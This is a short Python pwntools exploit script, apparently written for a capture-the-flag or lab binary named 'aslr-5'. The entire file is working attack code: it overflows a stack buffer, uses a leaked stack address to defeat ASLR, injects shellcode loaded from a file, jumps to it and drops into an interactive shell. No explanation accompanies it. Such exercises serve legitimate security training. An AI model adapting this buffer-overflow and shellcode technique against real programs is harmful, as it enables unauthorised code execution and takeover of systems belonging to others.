#!/usr/bin/env python

from pwn import *
import re

p = process("./aslr-5")

f = open("shellcode.bin", "r")
shellcode = f.read().strip()
f.close()

checkfunc_addr = 0x080484b3
inputfunc_addr = 0x080484cc
print(p.recvuntil("name:"))

# create & send buffer
buffer = "A"*140 + p32(checkfunc_addr) + p32(inputfunc_addr)
p.sendline(buffer)

print(p.recvuntil("some?: "))
raw_data = p.recvuntil("\n").split()
raw_addr = int(raw_data[-4],0)

buff_offset = 0xc0
buff_addr = raw_addr - buff_offset

print(p.recvuntil("name:"))

buffer = shellcode + "A"*(140-36) + p32(buff_addr+8)
p.sendline(buffer)
p.interactive()
